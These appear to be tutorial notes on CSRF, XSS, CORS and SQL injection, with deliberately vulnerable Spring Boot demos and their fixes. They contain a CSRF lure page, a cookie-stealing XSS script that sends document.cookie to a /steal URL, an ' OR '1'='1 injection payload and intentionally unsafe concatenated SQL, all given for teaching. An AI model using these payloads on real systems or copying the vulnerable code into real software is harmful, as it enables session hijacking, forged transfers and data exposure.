# Common Attacks with Demo (HLD #32 / Spring Boot Security "Attacks")

<!-- nav -->
⬅ [28 API Gateway Concepts](28_API_Gateway_Concepts_Notes.md) · [Index](00_HLD_Index.md) · [33 Dual Write Problem](33_Dual_Write_Problem_Notes.md) ➡
<!-- nav -->

Source: https://drive.google.com/file/d/1JINOQHR7j2B-R_9IaduT6wDn1MLpKfTX/view?usp=drive_link

Before starting Spring Security, understand the common web attacks: **CSRF, XSS, CORS (not an attack), SQL Injection** – what each is, a demo of the vulnerability, and how to protect against it.

---

<!-- simple-explanation -->
## In simple words – common web attacks and how to stop them

Before learning Spring Security it helps to understand *what* it is protecting you from. Here are four ideas, each with an everyday explanation.

### 1. CSRF – Cross-Site Request Forgery ("tricking your browser")
**Situation:** you are logged in to your bank in one tab. The browser **automatically attaches your cookie/session** to every request going to the bank.
**Attack:** you open a malicious page with a button like **"Claim My Money"**. The button secretly points to `http://bank/transfer?amount=1000&to=attacker`. You click it, your browser sends the request **with your valid session cookie**, and the bank thinks *you* asked for the transfer.
**Why it works:** the server can't tell whether the request really came from its own page or from someone else's page.
**Defence:** a **CSRF token**, a random value the server puts into its own forms and then expects back in every state-changing request. The attacker's page can't know the token, so the forged request is rejected. (It mainly matters for session/cookie-based, stateful logins.)

### 2. XSS – Cross-Site Scripting ("planting a script on a page")
**Situation:** a site lets users post comments and shows them to everybody.
**Attack:** the attacker posts a comment that contains code, e.g. `<script>…</script>`. If the site displays it **without cleaning it**, every visitor's browser runs that script. The script can show pop-ups, deface the page, or **steal the visitor's cookie** (including the session ID) and send it to the attacker, who can then act as that user.
**Defence:**
- **Escape output:** turn special characters into harmless text (`<` becomes `&lt;`) so the browser displays them instead of running them. In the demo, use `th:text` instead of `th:utext`.
- **Validate input** before accepting it.

### 3. CORS – Cross-Origin Resource Sharing (a safety rule, *not* an attack)
An **origin** is **protocol + domain + port**. `https://localhost:8080` and `http://localhost:8080` are different origins (protocol differs), and so are different ports or sub-domains.
By default, browsers **block a web page from calling a server on a different origin**, to protect users. If your frontend and backend legitimately live on different origins, the **server must explicitly allow** the frontend by sending headers like `Access-Control-Allow-Origin`. In Spring you configure the allowed origins, methods and headers. Don't allow everything (`*`) unless the API is truly public.

### 4. SQL Injection ("input that rewrites your query")
**Unsafe code** builds SQL by gluing text together:
`"SELECT * FROM user_details WHERE user_name = '" + name + "'"`
**Attack:** the user types `' OR '1' = '1` as the name. The query becomes `… WHERE user_name = '' OR '1' = '1'`, which is always true, so **all rows** are returned. Attackers can use the same trick to read, change or delete data.
**Defence:** use **parameterized queries** (prepared statements): `WHERE user_name = :name` and pass the value separately. The database treats the input purely as **data**, never as SQL, so the same attack returns nothing.

### Summary
| Attack | Core idea | Defence |
|---|---|---|
| CSRF | Browser sends your cookies to a request you didn't intend | CSRF token |
| XSS | Attacker's script runs in other users' browsers | Escape output, validate input |
| CORS | Browser blocks cross-origin calls unless the server allows | Whitelist trusted origins |
| SQL injection | Input changes the SQL meaning | Parameterized queries |
<!-- simple-explanation -->


## 1. CSRF – Cross-Site Request Forgery

- The user is **already authenticated** to a site.
- A CSRF attack **tricks the browser into making an unwanted request** to a site where the user is already authenticated.
- Applicable where **state/session is managed** (stateful, cookie/session-based authentication).

### Demo setup
Authentication is mandatory for all endpoints and the app uses **sessions (stateful)**.

`SecurityConfig.java`
```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http.sessionManagement(session ->
                session.sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED))
            .authorizeHttpRequests(auth -> auth.anyRequest().authenticated())
            .formLogin(Customizer.withDefaults());
        return http.build();
    }
}
```
`UserController.java` (CSRF demo)
```java
@RestController
public class UserController {
    @GetMapping("/transfer")
    public String transferMoney(@RequestParam String amount, @RequestParam String to) {
        return "Transferred $" + amount + " to " + to;
    }

    @GetMapping("/")
    public String hello() { return "hello"; }
}
```

### Attack steps
1. Make the user **authenticated** on the server.
2. Send some **malicious link/page** to this authenticated user:
```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CSRF Attack Demo</title>
</head>
<body>
  <h2>Click Below to Claim Your Reward!</h2>
  <a href="http://localhost:8080/transfer?amount=1000&to=attacker">
    <button>Claim My Money</button>
  </a>
</body>
</html>
```
As soon as the user clicks **"Claim My Money"**, an **unwanted operation is executed** – and the **browser automatically appends the cookies/session** to the request.

### Protection
- Use a **CSRF token** – ensures the request **originates from the legitimate source**.
- Authenticated forms / the website append the CSRF token to the request; the server validates it against the token created at **HTTP session creation time**.

---

## 2. XSS – Cross-Site Scripting

- Lets an attacker **inject a malicious script into a web page viewed by other users** (e.g. a comments section).
- Commonly used to **steal sessions** or **deface the website**.

### Demo setup
- `GET /xss` – loads all comments; returns `"xss"`; since it's a `@Controller` (not `@RestController`) it looks for **xss.html** and renders it.
- `POST /comment` – **does not sanitize user input**; stores the comment (e.g. in DB) and displays it on GET.
- If an attacker posts a malicious script, **every GET call runs that script for all users**.

`TestXSS.java`
```java
@Controller
public class TestXSS {
    private final List<String> comments = new ArrayList<>();

    @GetMapping("/xss")
    public String showComments(Model model) {
        model.addAttribute("comments", comments);
        return "xss"; // Loads xss.html
    }

    @PostMapping("/comment")
    public String addComment(@RequestParam String comment) {
        comments.add(comment);
        return "redirect:/xss";
    }
}
```
`src/main/resources/templates/xss.html`
```html
<!DOCTYPE html>
<html xmlns:th="http://www.w3.org/1999/xhtml">
<head><title>XSS Demo</title></head>
<body>
  <h2>Leave a Comment</h2>
  <form action="/comment" method="post">
    <input type="text" name="comment" required>
    <button type="submit">Submit</button>
  </form>

  <h3>Comments:</h3>
  <ul>
    <!-- Comments are directly injected without sanitization -->
    <li th:utext="${comment}" th:each="comment : ${comments}"></li>
  </ul>
</body>
</html>
```
### Attack
- Insert `<script>alert("XSS Attack")</script>` and submit → the script is stored (e.g. in DB); when the comments are fetched and returned, **the browser executes it**.
- Worse – cookie theft:
```html
<script>
  fetch('http://localhost:8080/steal?cookie=' + document.cookie);
</script>
```
  Any user who loads the comments page has their **cookie sent to the attacker's URL**. That cookie holds the **JSESSIONID**, which the attacker can use to perform unwanted operations in the victim's active session.

### Protection
- **Properly escape user input** (convert special characters, e.g. `<` → `&lt;`) – e.g. use `th:text` instead of `th:utext`.
- **Properly validate data** before rendering.

---

## 3. CORS – Cross-Origin Resource Sharing

- **Not an attack** – a **security feature** that restricts web pages from making requests to a **different origin** unless the server allows it.
- **Origin = protocol + domain + port.**

Examples of *different* origins:
| Client | Server | Why different |
|---|---|---|
| `https://localhost:8080` | `http://localhost:8080` | different **protocol** |
| `https://localhost:9090` | `https://localhost:8080` | different **port** |
| `https://sub.localhost:9090` | `https://localhost:9090` | different **domain/sub-domain** |

By default, a client calling a server on a different origin is **blocked by CORS**. The **server has to allow** the request (e.g. from `https://localhost:8080`) by setting **`Access-Control-Allow-Origin`** and other headers.

`SecurityConfig.java` (with CORS)
```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http.sessionManagement(session ->
                session.sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED))
            .authorizeHttpRequests(auth -> auth.anyRequest().authenticated())
            .cors(cors -> cors.configurationSource(request -> {
                CorsConfiguration config = new CorsConfiguration();
                config.setAllowedOrigins(List.of("https://sub.localhost:9090")); // Allow frontend
                config.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE"));
                config.setAllowedHeaders(List.of("Authorization", "Content-Type"));
                config.setAllowCredentials(true);
                return config;
            }))
            .formLogin(Customizer.withDefaults());
        return http.build();
    }
}
```

---

## 4. SQL Injection

The attacker **manipulates the SQL query by inserting malicious input into a user field**.

`UserController.java` (find user)
```java
@GetMapping("/find")
public List<UserDetails> findUser(@RequestParam String name) {
    return userDetailsService.findByName(name);
}
```
`UserDetailsService.java` – **unsafe query** (string concatenation)
```java
public List<UserDetails> findByName(String name) {
    String sql = "SELECT * FROM user_details WHERE user_name = '" + name + "'";
    return entityManager.createNativeQuery(sql, UserDetails.class).getResultList();
}
```
**Demo:** calling `/find?name=' OR '1' = '1` makes the condition always true → **returns all rows** of `user_details` (the demo table had two users: `AA` phone 111 and `BB` phone 222, and both were returned).

### Protection – parameterized query
`UserDetailsService.java` – **safe query**
```java
public List<UserDetails> findByName(String name) {
    String sql = "SELECT * FROM user_details WHERE user_name = :name";
    return entityManager.createNativeQuery(sql, UserDetails.class)
                        .setParameter("name", name)
                        .getResultList();
}
```
With the same input `' OR '1' = '1`, the response is now an **empty list `[]`** – the input is treated as data, not SQL.

---

## Quick revision
| Attack | What happens | Defence |
|---|---|---|
| **CSRF** | Browser tricked into sending an authenticated request (cookies auto-attached) | **CSRF token** |
| **XSS** | Malicious script stored/rendered in other users' pages; can steal JSESSIONID | **Escape output**, validate input |
| **CORS** | Browser blocks cross-origin calls (origin = protocol + domain + port) – a feature, not an attack | Server whitelists origins/methods/headers (`Access-Control-Allow-Origin`) |
| **SQL Injection** | User input alters SQL query | **Parameterized queries** |

---

<!-- nav -->
⬅ [28 API Gateway Concepts](28_API_Gateway_Concepts_Notes.md) · [Index](00_HLD_Index.md) · [33 Dual Write Problem](33_Dual_Write_Problem_Notes.md) ➡
<!-- nav -->
